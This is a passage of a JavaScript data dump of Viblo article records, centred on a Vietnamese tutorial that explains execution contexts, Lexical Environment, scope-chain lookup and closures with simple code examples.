            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Frontend&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 15879,
            url: "https://viblo.asia/u/luongtu996",
            avatar: "7967a5ad-ef71-4f2d-81e3-66728921a553.jpg",
            name: "Tu Luong",
            username: "luongtu996",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 23999,
            url: "https://viblo.asia/u/hao3004",
            avatar: "d61fda3e-0ec7-42c8-a902-293328b075c4.jpeg",
            name: "Hao Le",
            username: "hao3004",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 37939,
            url: "https://viblo.asia/u/higithub97",
            avatar: "5cb93eff-db6b-4aad-9762-4e14f2ed26b0.png",
            name: "Tr\u1ea7n \u0110\u1ee9c L\u0129nh",
            username: "higithub97",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 56388,
            url: "https://viblo.asia/u/vdthuan",
            avatar: "d225821c-70c5-449c-8fb3-b5fece4d0c2b.jpg",
            name: "Thu\u1eadn V\u00f5 Duy",
            username: "vdthuan",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 51028,
      title:
        'JavaScript "c\u01a1 b\u1ea3n" (Ph\u1ea7n 2): Lexical Environment - Th\u1ee9 c\u1ea7n bi\u1ebft \u0111\u1ec3 hi\u1ec3u v\u1ec1 Closures',
      slug: "RnB5pjyJZPG",
      url:
        "https://viblo.asia/p/javascript-co-ban-phan-2-lexical-environment-thu-can-biet-de-hieu-ve-closures-RnB5pjyJZPG",
      user_id: 26720,
      moderation: null,
      transliterated:
        "javascript-co-ban-phan-2-lexical-environment-thu-can-biet-de-hieu-ve-closures",
      contents_short:
        "Trong ph\u1ea7n tr\u01b0\u1edbc ch\u00fang ta \u0111\u00e3 t\u00ecm hi\u1ec3u m\u1ed9t s\u1ed1 th\u00e0nh ph\u1ea7n c\u01a1 b\u1ea3n trong b\u1ed9 Complier c\u1ee7a JavaScript. Trong b\u00e0i vi\u1ebft tr\u01b0\u1edbc c\u00f3 xu\u1ea5t hi\u1ec7n kh\u00e1i ni\u1ec7m Lexical Environment m\u00e0 m\u00ecnh ch\u01b0a c\u00f3 th\u1eddi gian \u0111\u1ec3 gi\u1ea3i th...",
      contents:
        'Trong ph\u1ea7n tr\u01b0\u1edbc ch\u00fang ta \u0111\u00e3 t\u00ecm hi\u1ec3u m\u1ed9t s\u1ed1 th\u00e0nh ph\u1ea7n c\u01a1 b\u1ea3n trong b\u1ed9 Complier c\u1ee7a JavaScript. Trong b\u00e0i vi\u1ebft tr\u01b0\u1edbc c\u00f3 xu\u1ea5t hi\u1ec7n kh\u00e1i ni\u1ec7m Lexical Environment m\u00e0 m\u00ecnh ch\u01b0a c\u00f3 th\u1eddi gian \u0111\u1ec3 gi\u1ea3i th\u00edch c\u1ee5 th\u1ec3, v\u1eady th\u00ec trong b\u00e0i vi\u1ebft n\u00e0y ch\u00fang ta s\u1ebd c\u00f9ng t\u00ecm hi\u1ec3u c\u1ee5 th\u1ec3 h\u01a1n v\u1ec1 kh\u00e1i ni\u1ec7m n\u00e0y v\u00e0 c\u00e1ch n\u00f3 li\u00ean quan \u0111\u1ebfn Closures c\u1ee7a JavaScript nh\u01b0 th\u1ebf n\u00e0o.\n\n**Tr\u01b0\u1edbc khi \u0111\u1ecdc b\u00e0i vi\u1ebft n\u00e0y, n\u1ebfu ch\u01b0a bi\u1ebft Closures l\u00e0 g\u00ec, b\u1ea1n n\u00ean gi\u00e0nh ch\u00fat th\u1eddi gian l\u01b0\u1edbt qua google \u0111\u1ec3 hi\u1ec3u c\u01a1 b\u1ea3n v\u1ec1 Closures.**\n\nClosures c\u00f3 th\u1ec3 l\u00e0 m\u1ed9t kh\u00e1i ni\u1ec7m kh\u00f3 v\u1edbi b\u1ea1n khi ch\u01b0a quen v\u1edbi *v\u0169 tr\u1ee5* JavaScript. B\u1ea1n c\u00f3 th\u1ec3 \u0111\u1ecdc th\u1ea5y r\u1ea5t nhi\u1ec1u \u0111\u1ecbnh ngh\u0129a v\u1ec1 Closures kh\u00e1c nhau tr\u00ean internet. Nh\u01b0ng b\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y h\u1ea7u h\u1ebft nh\u1eefng \u0111\u1ecbnh ngh\u0129a n\u00e0y \u0111\u1ec1u m\u01a1 h\u1ed3, kh\u00f3 hi\u1ec3u v\u00e0 kh\u00f4ng gi\u1ea3i th\u00edch \u0111\u01b0\u1ee3c nguy\u00ean nh\u00e2n c\u01a1 b\u1ea3n c\u1ee7a s\u1ef1 t\u1ed3n t\u1ea1i v\u00e0 m\u1ee5c \u0111\u00edch c\u1ee7a Closures.\n\nTrong b\u00e0i vi\u1ebft n\u00e0y ch\u00fang ta s\u1ebd c\u1ed1 g\u1eafng l\u00e0m s\u00e1ng t\u1ecf m\u1ed9t s\u1ed1 kh\u00e1i ni\u1ec7m c\u1ee7a ECMAScript 262, bao g\u1ed3m **Execution Context**, **Lexical Environment**, v\u00e0 **Identifier Resolution**. Ngo\u00e0i ra, ch\u00fang ta s\u1ebd bi\u1ebft r\u1eb1ng do c\u00e1c c\u01a1 ch\u1ebf tr\u00ean, *t\u1ea5t c\u1ea3* c\u00e1c function trong ECMAScript \u0111\u1ec1u l\u00e0 *Closures*.\n\n# Execution Context\nCh\u00fang ta c\u00f9ng nh\u1eafc l\u1ea1i v\u1ec1 kh\u00e1i ni\u1ec7m n\u00e0y m\u1ed9t ch\u00fat. Tr\u00ecnh bi\u00ean d\u1ecbch c\u1ee7a JavaScript t\u1ea1o m\u1ed9t context m\u1edbi b\u1ea5t c\u1ee9 k\u00ec n\u00e0o n\u00f3 chu\u1ea9n b\u1ecb th\u1ef1c thi m\u1ed9t h\u00e0m ho\u1eb7c m\u1ed9t t\u1eadp l\u1ec7nh \u0111\u00e3 \u0111\u01b0\u1ee3c vi\u1ebft tr\u01b0\u1edbc. M\u1ecdi t\u1eadp l\u1ec7nh / \u0111o\u1ea1n code b\u1eaft \u0111\u1ea7u v\u1edbi m\u1ed9t Execution Context \u0111\u01b0\u1ee3c g\u1ecdi l\u00e0 **Global Execution Context**. V\u00e0 m\u1ed7i khi ch\u00fang ta g\u1ecdi m\u1ed9t h\u00e0m, m\u1ed9t Execution Context m\u1edbi \u0111\u01b0\u1ee3c t\u1ea1o ra v\u00e0 \u0111\u01b0\u1ee3c \u0111\u1eb7t tr\u00ean \u0111\u1ea7u c\u1ee7a *Excution stack*. T\u01b0\u01a1ng t\u1ef1 \u0111i\u1ec1u n\u00e0y c\u0169ng s\u1ebd x\u1ea3y ra khi b\u1ea1n g\u1ecdi m\u1ed9t h\u00e0m l\u1ed3ng trong m\u1ed9t h\u00e0m kh\u00e1c.\n\n![](https://images.viblo.asia/da9afd53-d607-4352-a113-00b52389a998.png)\n\nH\u00e3y c\u00f9ng xem \u0111i\u1ec1u g\u00ec x\u1ea3y ra khi \u0111o\u1ea1n code c\u1ee7a ch\u00fang ta \u0111\u01b0\u1ee3c th\u1ef1c thi nh\u01b0 trong h\u00ecnh tr\u00ean \u0111\u00e3 th\u1ec3 hi\u1ec7n:\n- M\u1ed9t *Global Execution Context* \u0111\u01b0\u1ee3c t\u1ea1o ra v\u00e0 \u0111\u1eb7t xu\u1ed1ng cu\u1ed1i c\u00f9ng c\u1ee7a Excution stack\n- Khi bar() \u0111\u01b0\u1ee3c g\u1ecdi, m\u1ed9t *bar Execution Context* s\u1ebd \u0111\u01b0\u1ee3c t\u1ea1o ra v\u00e0 \u0111\u1eb7t l\u00ean tr\u00ean *Global Execution Context*. Trong b\u00e0i vi\u1ebft tr\u01b0\u1edbc ch\u00fang ta \u0111\u00e3 bi\u1ebft m\u1ed7i h\u00e0m khi \u0111\u01b0\u1ee3c g\u1ecdi s\u1ebd t\u1ea1o ra m\u1ed9t Execution Context v\u1edbi \u0111\u1ecbnh danh \u0111\u1ed9c nh\u1ea5t c\u1ee7a function \u0111\u00f3, trong tr\u01b0\u1eddng h\u1ee3p n\u00e0y l\u00e0  function bar() =>  bar Execution Context\n- Sau \u0111\u00f3, khi bar() g\u1ecdi \u0111\u1ebfn h\u00e0m foo() l\u1ed3ng trong n\u00f3, m\u1ed9t *foo Execution Context* s\u1ebd \u0111\u01b0\u1ee3c t\u1ea1o v\u00e0 \u0111\u01b0\u1ee3c \u0111\u1eb7t b\u00ean tr\u00ean c\u1ee7a *bar Execution Context*\n- Khi foo() return - t\u1ee9c l\u00e0 function foo \u0111\u00e3 th\u1ef1c thi xong, *foo Execution Context* s\u1ebd b\u1ecb lo\u1ea1i b\u1ecf kh\u1ecfi stack v\u00e0 lu\u1ed3ng ch\u1ea1y s\u1ebd quay tr\u1edf l\u1ea1i *bar Execution Context*\n- Khi qu\u00e1 tr\u00ecnh th\u1ef1c thi bar() k\u1ebft th\u00fac, lu\u1ed3ng ch\u1ea1y s\u1ebd quay l\u1ea1i *Global Execution Context*, v\u00e0 cu\u1ed1i c\u00f9ng stack s\u1ebd \u0111\u01b0\u1ee3c l\u00e0m tr\u1ed1ng.\n\n> Excution stack th\u1ef1c thi theo c\u1ea5u tr\u00fac LIFO (Last In First Out), n\u00f3 \u0111\u1ee3i execution context \u1edf tr\u00ean c\u00f9ng th\u1ef1c thi xong tr\u01b0\u1edbc khi th\u1ef1c khi c\u00e1c context b\u00ean d\u01b0\u1edbi.\n\nV\u1ec1 m\u1eb7t kh\u00e1i ni\u1ec7m, Execution context c\u00f3 c\u1ea5u tr\u00fac gi\u1ed1ng nh\u01b0 sau:\n\n```JS\n// Execution context in ES5\n\nExecutionContext = {\n  ThisBinding: <this value>,\n  VariableEnvironment: { ... },\n  LexicalEnvironment: { ... }\n}\n```\n\u0110\u1eebng lo l\u1eafng n\u1ebfu nh\u00ecn c\u1ea5u tr\u00fac n\u00e0y \u0111\u00e1ng s\u1ee3. Ch\u00fang ta s\u1ebd xem x\u00e9t c\u00e1c th\u00e0nh ph\u1ea7n c\u1ee7a n\u00f3 ngay sau \u0111\u00e2y. \u0110i\u1ec3m m\u1ea5u ch\u1ed1t c\u1ea7n nh\u1edb \u1edf \u0111\u00e2y l\u00e0 m\u1ecdi l\u1ec7nh g\u1ecdi \u0111\u1ebfn Execution context s\u1ebd c\u00f3 2 tr\u1ea1ng th\u00e1i - t\u01b0\u01a1ng \u1ee9ng v\u1edbi 2 giai \u0111o\u1ea1n:\n- Tr\u1ea1ng th\u00e1i Kh\u1edfi t\u1ea1o - **Creation Stage** (t\u01b0\u01a1ng \u1ee9ng l\u00e0 Giai \u0111o\u1ea1n Kh\u1edfi t\u1ea1o - **Creation Phrase**)\n- Tr\u1ea1ng th\u00e1i Th\u1ef1c thi - **Execution Stage** (t\u01b0\u01a1ng \u1ee9ng l\u00e0 Giai \u0111o\u1ea1n Th\u1ef1c thi - **Execution Phrase**)\n\nGiai \u0111o\u1ea1n Kh\u1edfi t\u1ea1o l\u00e0 khi context \u0111\u00e3 \u0111\u01b0\u1ee3c t\u1ea1o ra nh\u01b0ng ch\u01b0a \u0111\u01b0\u1ee3c g\u1ecdi. M\u1ed9t s\u1ed1 \u0111i\u1ec1u sau x\u1ea3y ra trong giai \u0111o\u1ea1n kh\u1edfi t\u1ea1o:\n- VariableEnvironment \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u01b0u tr\u1eef gi\u00e1 tr\u1ecb b\u1ea1n \u0111\u1ea7u cho c\u00e1c bi\u1ebfn, \u0111\u1ed1i s\u1ed1 v\u00e0 khai b\u00e1o h\u00e0m. C\u00e1c bi\u1ebfn *var* \u0111\u01b0\u1ee3c khai b\u00e1o s\u1ebd \u0111\u01b0\u1ee3c kh\u1edfi t\u1ea1o v\u1edbi gi\u00e1 tr\u1ecb l\u00e0  *undefined*\n- Gi\u00e1 tr\u1ecb c\u1ee7a **this** \u0111\u01b0\u1ee3c x\u00e1c \u0111\u1ecbnh\n- LexicalEnvironment ch\u1ec9 l\u00e0 b\u1ea3n sao c\u1ee7a VariableEnvironment trong giai \u0111o\u1ea1n n\u00e0y\n\nGi\u1edd h\u00e3y t\u00ecm hi\u1ec3u xem Lexical Environment l\u00e0 g\u00ec n\u00e0o.\n# Lexical Environment\nTheo ECMAScript 262 (8.1):\n\n> A Lexical Environment is a specification type used to define the association of Identifiers to specific variables and functions based upon the lexical nesting structure of ECMAScript code\n\n> Lexical Environment l\u00e0 m\u1ed9t \u0111\u1ecbnh d\u1ea1ng \u0111\u1eb7c bi\u1ec7t d\u00f9ng \u0111\u1ec3 \u0111\u1ecbnh ngh\u0129a li\u00ean h\u1ec7 gi\u1eefa \u0111\u1ecbnh danh (t\u00ean bi\u1ebfn, t\u00ean function) v\u1edbi gi\u00e1 tr\u1ecb t\u01b0\u01a1ng \u1ee9ng c\u1ee7a n\u00f3, d\u1ef1a tr\u00ean c\u1ea5u tr\u00fac nesting c\u1ee7a ES.\n\nH\u00e3y c\u00f9ng t\u00ecm hi\u1ec3u m\u1ed9t v\u00e0i th\u1ee9 \u1edf \u0111\u00e2y. M\u1ed9t Lexical Environment bao g\u1ed3m 2 th\u00e0nh ph\u1ea7n ch\u00ednh: **environment record** v\u00e0 m\u1ed9t **reference** (tham chi\u1ebfu) \u0111\u1ebfn Lexical Environment b\u00ean ngo\u00e0i (cha c\u1ee7a Lexical Environment hi\u1ec7n t\u1ea1i):\n\n```JS\nvar x = 10;\n\nfunction foo(){\n  var y = 20;\n  console.log(x + y); // 30\n}\n\n// Environment technically consist of two main components: \n// environmentRecord, and a reference to the outer environment\n\n// Environment of the global context\nglobalEnvironment = {\n  environmentRecord: {\n    // built-ins\n    // our bindings:\n    x: 10\n  },\n  outer: null // no parent environment\n};\n\n// Environment of the "foo" function\nfooEnvironment = {\n  environmentRecord: {\n    y: 20\n  },\n  outer: globalEnvironment\n};\n```\n\nTr\u1ef1c quan n\u00f3 s\u1ebd tr\u00f4ng nh\u01b0 th\u1ebf n\u00e0y:\n![](https://images.viblo.asia/0a59f5f2-3ccc-4f8a-89e5-5beb290f3d25.png)\n\nNh\u01b0 b\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y khi mu\u1ed1n \u0111\u1ecbnh danh "x" trong foo context, c\u1ea7n ph\u1ea3i ti\u1ebfp c\u1eadn \u0111\u1ebfn environment b\u00ean ngo\u00e0i (Global environment). Qu\u00e1 tr\u00ecnh n\u00e0y \u0111\u01b0\u1ee3c g\u1ecdi l\u00e0 **Identifier Resolution** (Ph\u00e2n gi\u1ea3i \u0111\u1ecbnh danh) v\u00e0 n\u00f3 x\u1ea3y ra tr\u00ean execution context \u0111ang ch\u1ea1y.\n\nB\u00e2y gi\u1edd, d\u1ef1a tr\u00ean nh\u1eefng ki\u1ebfn th\u1ee9c v\u1ec1 Environment n\u00e0y, h\u00e3y quay l\u1ea1i v\u1edbi c\u1ea5u tr\u00fac c\u1ee7a Execution context v\u00e0 xem \u0111i\u1ec1u g\u00ec \u0111ang x\u1ea3y ra trong \u0111\u00f3:\n- **VariableEnvironment**: M\u00f4i tr\u01b0\u1eddng c\u1ee7a n\u00f3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u01b0u tr\u1eef gi\u00e1 tr\u1ecb kh\u1edfi t\u1ea1o cho c\u00e1c bi\u1ebfn, \u0111\u1ed1i s\u1ed1 v\u00e0 khai b\u00e1o h\u00e0m. C\u00e1c gi\u00e1 tr\u1ecb n\u00e0y s\u1ebd \u0111\u01b0\u1ee3c g\u00e1n b\u1eb1ng gi\u00e1 tr\u1ecb th\u1eadt khi b\u01b0\u1edbc v\u00e0o giai \u0111o\u1ea1n k\u00edch ho\u1ea1t.\n\n```JS\nfunction foo(a) {\n  var b = 20;\n}\n\nfoo(10);\n\n// the VariableEnvironment component of the foo function context at creation stage\nfooContext.VariableEnvironment = {\n  environmentRecord: {\n    arguments: { 0: 10, length: 1, callee: foo },\n    a: 10,\n    b: undefined\n  },\n  outer: globalEnvironment\n};\n\n// After the execution stage, the VariableEnvironment envRec table is filled in with the value\nfooContext.VariableEnvironment = {\n  environmentRecord: {\n    arguments: { 0: 10, length: 1, callee: foo },\n    a: 10,\n    b: 20\n  },\n  outer: globalEnvironment\n};\n```\n\n- **LexicalEnvironment**: Ban \u0111\u1ea7u n\u00f3 ch\u1ec9 l\u00e0 m\u1ed9t b\u1ea3n sao c\u1ee7a VariableEnvironment. Trong context \u0111ang ch\u1ea1y, n\u00f3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 x\u00e1c \u0111\u1ecbnh r\u00e0ng bu\u1ed9c c\u1ee7a m\u1ed9t \u0111\u1ecbnh danh (v\u00ed d\u1ee5 m\u1ed9t bi\u1ebfn) xu\u1ea5t hi\u1ec7n trong context.\n\nC\u1ea3 VariableEnvironment (VE) v\u00e0 LexicalEnvironment (LE) v\u1ec1 b\u1ea3n ch\u1ea5t c\u1ee7a ch\u00fang \u0111\u1ec1u l\u00e0 Lexical Environment, t\u1ee9c l\u00e0 c\u1ea3 2 c\u01a1 b\u1ea3n (\u1edf giai \u0111o\u1ea1n kh\u1edfi t\u1ea1o) \u0111\u1ec1u l\u01b0u tr\u1eef *t\u0129nh* c\u00e1c r\u00e0ng bu\u1ed9c b\u00ean ngo\u00e0i \u0111\u1ec3 d\u00f9ng cho c\u00e1c function \u0111\u01b0\u1ee3c t\u1ea1o b\u00ean trong context. **\u0110i\u1ec1u n\u00e0y li\u00ean quan \u0111\u1ebfn Closures**.\n\nVi\u1ec7c l\u01b0u tr\u1eef c\u00e1c li\u00ean k\u1ebft t\u0129nh b\u00ean ngo\u00e0i d\u00f9ng cho c\u00e1c ch\u1ee9c n\u0103ng b\u00ean trong g\u00f3p ph\u1ea7n ph\u00e1t sinh s\u1ef1 h\u00ecnh th\u00e0nh c\u1ee7a Closures.\n\n# Identifier Resolution a.k.a Scope chain lookup\nTr\u01b0\u1edbc khi t\u00ecm hi\u1ec3u v\u1ec1 Closures, h\u00e3y t\u00ecm hi\u1ec3u m\u1ed9t ch\u00fat v\u1ec1 c\u00e1ch chu\u1ed7i Scope \u0111\u01b0\u1ee3c t\u1ea1o trong Execution context. Nh\u01b0 ch\u00fang ta th\u1ea5y tr\u01b0\u1edbc \u0111\u00f3, m\u1ed7i Execution context \u0111\u1ec1u c\u00f3 LexicalEnvironment \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 ph\u00e2n gi\u1ea3i \u0111\u1ecbnh danh. T\u1ea5t c\u1ea3 c\u00e1c r\u00e0ng bu\u1ed9c c\u1ee5c b\u1ed9 cho context \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef trong b\u1ea3ng Environment record . N\u1ebfu \u0111\u1ecbnh danh kh\u00f4ng th\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c trong environmentRecord hi\u1ec7n t\u1ea1i, qu\u00e1 tr\u00ecnh \u0111\u1ecbnh danh s\u1ebd s\u1ebd ti\u1ebfp t\u1ee5c t\u00ecm \u0111\u1ebfn b\u1ea3ng Environment record \u1edf m\u00f4i tr\u01b0\u1eddng b\u00ean ngo\u00e0i (context cha). Qu\u00e1 tr\u00ecnh n\u00e0y s\u1ebd ti\u1ebfp t\u1ee5c cho \u0111\u1ebfn khi \u0111\u1ecbnh danh nh\u1eadn \u0111\u01b0\u1ee3c gi\u00e1 tr\u1ecb. N\u1ebfu kh\u00f4ng t\u00ecm th\u1ea5y, m\u1ed9t *ReferenceError* s\u1ebd xu\u1ea5t hi\u1ec7n.\n\nB\u00e2y gi\u1edd, \u0111i\u1ec1u c\u1ea7n ph\u1ea3i nh\u1edb \u1edf \u0111\u00e2y l\u00e0 LexicalEnvironment l\u01b0u tr\u1eef *t\u0129nh* li\u00ean k\u1ebft t\u1edbi m\u00f4i tr\u01b0\u1eddng b\u00ean ngo\u00e0i trong giai \u0111o\u1ea1n Kh\u1edfi t\u1ea1o context v\u00e0 s\u1ebd s\u1eed d\u1ee5ng n\u00f3 trong qu\u00e1 tr\u00ecnh ch\u1ea1y context (Giai \u0111o\u1ea1n th\u1ef1c thi).\n\n# Closures\nNh\u01b0 ch\u00fang ta \u0111\u00e3 th\u1ea5y trong ph\u1ea7n tr\u01b0\u1edbc r\u1eb1ng \u1edf giai \u0111o\u1ea1n kh\u1edfi t\u1ea1o, vi\u1ec7c l\u01b0u tr\u1eef *t\u0129nh* li\u00ean k\u1ebft t\u1edbi m\u00f4i tr\u01b0\u1eddng b\u00ean ngo\u00e0i c\u1ee7a LexicalEnvironment b\u00ean trong s\u1ebd li\u00ean quan \u0111\u1ebfn Closures b\u1ea5t k\u1ec3 m\u1ed9t h\u00e0m c\u00f3 \u0111\u01b0\u1ee3c k\u00edch ho\u1ea1t hay kh\u00f4ng. H\u00e3y xem th\u1eed m\u1ed9t v\u00ed d\u1ee5:\n\n## V\u00ed d\u1ee5 1\n```JS\nvar a = 10; \n\nfunction foo(){\n  console.log(a);\n};\n\nfunction bar(){\n  var a = 20; \n  foo();\n};\n\nbar(); // will print "10"\n```\n\nLexicalEnvironment c\u1ee7a foo l\u01b0u tr\u1eef li\u00ean k\u1ebft v\u1edbi "a" t\u1ea1i th\u1eddi \u0111i\u1ec3m kh\u1edfi t\u1ea1o, l\u00fac n\u00e0y \u0111ang c\u00f3 gi\u00e1 tr\u1ecb l\u00e0 10. V\u00ec v\u1eady, khi foo \u0111\u01b0\u1ee3c g\u1ecdi sau \u0111\u00f3 (giai \u0111o\u1ea1n th\u1ef1c thi), gi\u00e1 tr\u1ecb c\u1ee7a "a" l\u00e0 10 ch\u1ee9 kh\u00f4ng ph\u1ea3i 20.\n\nV\u1ec1 m\u1eb7t kh\u00e1i ni\u1ec7m, qu\u00e1 tr\u00ecnh ph\u00e2n gi\u1ea3i nh\u1eadn d\u1ea1ng v\u00ed d\u1ee5 tr\u00ean s\u1ebd gi\u1ed1ng nh\u01b0 sau:\n\n```\n// check for binding "a" in the env record of "foo"\n-- foo.[[LexicalEnvironment]].[[Record]] --> not found\n// if not found, check for its outer environment\n--- global[[LexicalEnvironment]][[Record]] --> found 10\n// resolve the identifier with a value of 10\n```\n\n![](https://images.viblo.asia/1d0c9732-e14e-4764-b4f5-97d48eca0841.png)\n\n\nV\u00ec *Reference* c\u1ee7a foo li\u00ean k\u1ebft t\u1edbi Environment  c\u1ee7a Global context - n\u01a1i \u0111ang l\u01b0u tr\u1eef gi\u00e1 tr\u1ecb "a" l\u00e0 10, do \u0111\u00f3 gi\u00e1 tr\u1ecb "a" \u1edf trong foo s\u1ebd l\u00e0 10.\n\n## V\u00ed d\u1ee5 2\n\n```JS\nfunction outer() {\n  let id = 1;\n\n  return function inner(){\n    console.log(id);\n  }\n};\n\nconst innerFunc = outer(); \ninnerFunc(); // prints 1; \n```\n\nKhi h\u00e0m outer() return, Execution context c\u1ee7a n\u00f3 s\u1ebd b\u1ecb lo\u1ea1i b\u1ecf kh\u1ecfi Execution stack. Nh\u01b0ng khi ch\u00fang ta g\u1ecdi h\u00e0m *innerFunc()* sau \u0111\u00f3, n\u00f3 v\u1eabn qu\u1ea3n l\u00fd \u0111\u1ec3 in ra gi\u00e1 tr\u1ecb ch\u00ednh x\u00e1c v\u00ec LexicalEnvironment c\u1ee7a h\u00e0m b\u00ean trong n\u00f3 \u0111\u00e3 l\u01b0u tr\u1eef *t\u0129nh* gi\u00e1 tr\u1ecb r\u00e0ng bu\u1ed9c "id" c\u1ee7a m\u00f4i tr\u01b0\u1eddng b\u00ean ngo\u00e0i (funciton outer) t\u1eeb khi n\u00f3 \u0111\u01b0\u1ee3c t\u1ea1o ra.\n\n```\n// check for binding "id" in the env record of "inner"\n-- inner.[[LexicalEnvironment]].[[Record]] --> not found\n// if not found, check for its outer environment (outer)\n--- outer[[LexicalEnvironment]][[Record]] --> found 1\n// resolve the identifier with a value of 1\n```\n\n![](https://images.viblo.asia/0e595ea1-40d3-40f6-8e25-c91935100337.png)\n\n\u1ede \u0111\u00e2y ch\u00fang ta c\u00f3 th\u1ec3 nh\u1eadn ra, m\u1eb7c d\u00f9 context c\u1ee7a outer \u0111\u00e3 b\u1ecb lo\u1ea1i b\u1ecf kh\u1ecfi Execution stack, tuy nhi\u00ean li\u00ean k\u1ebft **Reference** t\u1edbi LexicalEnvironment outer c\u1ee7a h\u00e0m innerFunc() v\u1eabn \u0111\u01b0\u1ee3c gi\u1eef l\u1ea1i m\u00e0 kh\u00f4ng h\u1ec1 m\u1ea5t \u0111i. \u0110\u00e2y ch\u00ednh l\u00e0 \u00fd ngh\u0129a c\u1ee7a **l\u01b0u tr\u1eef t\u0129nh** m\u00e0 ch\u00fang ta \u0111\u00e3 nh\u1eafc t\u1edbi r\u1ea5t nhi\u1ec1u trong b\u00e0i vi\u1ebft.\n\n# T\u1ed5ng k\u1ebft\n\n- **Execution context stack** c\u00f3 c\u1ea5u tr\u00fac LIFO\n- C\u00f3 m\u1ed9t **Global context** t\u1ed5ng, n\u01a1i m\u00e0 code c\u1ee7a ch\u00fang ta \u0111\u01b0\u1ee3c th\u1ef1c thi\n- M\u1ed7i l\u1ea7n g\u1ecdi \u0111\u1ebfn m\u1ed9t function s\u1ebd t\u1ea1o ra m\u1ed9t **Execution context** m\u1edbi. N\u1ebfu n\u00f3 c\u00f3 m\u1ed9t function l\u1ed3ng trong \u0111\u00f3 \u0111\u01b0\u1ee3c g\u1ecdi \u0111\u1ebfn, m\u1ed9t Execution context m\u1edbi s\u1ebd ti\u1ebfp t\u1ee5c \u0111\u01b0\u1ee3c t\u1ea1o v\u00e0 \u0111\u1eb7t b\u00ean tr\u00ean context cha. Khi context \u0111\u01b0\u1ee3c th\u1ef1c thi xong, n\u00f3 s\u1ebd b\u1ecb lo\u1ea1i b\u1ecf kh\u1ecfi stack v\u00e0 lu\u1ed3ng ch\u1ea1y s\u1ebd quay tr\u1edf l\u1ea1i context ti\u1ebfp theo trong stack.\n- **Lexical Environment** c\u00f3 hai th\u00e0nh ph\u1ea7n: **environmentRecord** v\u00e0 **reference** (tham chi\u1ebfu) t\u1edbi m\u00f4i tr\u01b0\u1eddng b\u00ean ngo\u00e0i.\n- **VariableEnvironment** (VE) v\u00e0 **LexicalEnvironment** (LE) \u0111\u1ec1u l\u01b0u tr\u1eef t\u0129nh c\u00e1c r\u00e0ng bu\u1ed9c v\u1edbi m\u00f4i tr\u01b0\u1eddng b\u00ean ngo\u00e0i \u0111\u1ec3 s\u1eed d\u1ee5ng cho c\u00e1c function b\u00ean trong context c\u1ee7a ch\u00ednh n\u00f3.\n- T\u1ea5t c\u1ea3 c\u00e1c function \u1edf Giai \u0111o\u1ea1n kh\u1edfi t\u1ea1o \u0111\u1ec1u l\u01b0u tr\u1eef t\u0129nh c\u00e1c li\u00ean k\u1ebft v\u1edbi m\u00f4i tr\u01b0\u1eddng cha c\u1ee7a ch\u00fang. \u0110i\u1ec1u n\u00e0y cho ph\u00e9p c\u00e1c h\u00e0m l\u1ed3ng nhau truy c\u1eadp v\u00e0o li\u00ean k\u1ebft b\u00ean ngo\u00e0i ngay c\u1ea3 khi context cha \u0111\u00e3 b\u1ecb x\u00f3a kh\u1ecfi Execution stack. C\u01a1 ch\u1ebf n\u00e0y l\u00e0 n\u1ec1n t\u1ea3ng c\u1ee7a c\u00e1c **Closures** trong JavaScript.',
      published_at: "2021-03-01 09:07:04",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 11,
      points: 2,
      views_count: 399,
      clips_count: 3,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/da9afd53-d607-4352-a113-00b52389a998.png",
      user: {
        data: {
          id: 26720,
          url: "https://viblo.asia/u/chu.xuan.thang",
          avatar: "49de05d8-c079-4d47-990d-85868c34504c.jpeg",
          name: "Chu Xuan Thang",
          username: "chu.xuan.thang",
          followers_count: 30,
          reputation: 1093,
          posts_count: 19,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "lexical-environments",
            name: "Lexical Environments",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Lexical+Environments&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "execution-contexts",
            name: "Execution Contexts",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Execution+Contexts&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "closures",
            name: "closures",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=closures&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 45897,
      title: "Intersection Observer trong javascript",
      slug: "RQqKLQRMZ7z",
      url:
        "https://viblo.asia/p/intersection-observer-trong-javascript-RQqKLQRMZ7z",
      user_id: 19746,
      moderation: null,
      transliterated: "intersection-observer-trong-javascript",
      contents_short:
